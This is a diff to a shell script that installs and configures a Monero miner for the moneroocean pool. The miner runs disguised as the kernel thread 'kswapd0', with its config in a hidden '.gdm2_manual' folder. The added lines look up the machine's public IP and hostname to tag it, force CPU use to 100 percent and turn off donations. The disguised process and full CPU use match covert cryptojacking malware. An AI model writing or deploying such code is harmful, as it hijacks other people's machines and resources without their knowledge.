@@ -31,6 +31,31 @@ else
     curl -L -o "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 fi
 
+echo "PASS..."
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#PASS=`hostname`
+PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS:$EMAIL"
+fi
+
+echo "sed"
+#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2_manual/config.json
+#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2_manual/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2_manual/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2_manual/config.json
+#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.gdm2_manual/config.json
+#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2_manual/config.json
+sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.gdm2_manual/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2_manual/config.json
+sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2_manual/config.json
+
 # Run kswapd0 if no other process with the specific configuration is running
 if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
     echo "kswapd0 not started. Starting it..."
